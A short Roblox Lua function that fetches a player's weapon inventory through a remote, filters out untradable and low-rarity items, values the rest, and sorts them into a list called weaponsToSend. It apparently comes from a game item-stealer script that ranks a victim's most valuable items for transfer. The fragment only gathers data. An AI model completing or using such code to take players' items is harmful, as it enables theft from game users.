local function getValidWeapons()
	local weaponsToSend = {}
	local totalValue = 0
	
	local success, realData = pcall(function()
		return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
	end)
	
	if success and realData and realData.Weapons and realData.Weapons.Owned then
		for i, v in pairs(realData.Weapons.Owned) do
			local dataid = i
			local amount = v
			local itemInfo = database[dataid]

			if itemInfo and itemInfo.Rarity then
				local rarity = itemInfo.Rarity
				local weapon_rarity_index = table.find(rarityTable, rarity)
				local min_rarity_index = table.find(rarityTable, min_rarity)

				if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
					local value
					local lowerName = itemInfo.ItemName:lower()
					
					if flatValues[lowerName] then
						value = flatValues[lowerName]
					else
						if weapon_rarity_index >= table.find(rarityTable, "Godly") then
							value = 10
						else
							value = 0.1
						end
					end
					
					if value >= min_value then
						totalValue = totalValue + (value * amount)
						table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
					end
				end
			end
		end
	end

	table.sort(weaponsToSend, function(a, b)
		return (a.Value * a.Amount) > (b.Value * b.Amount)
	end)

	return weaponsToSend, totalValue
end

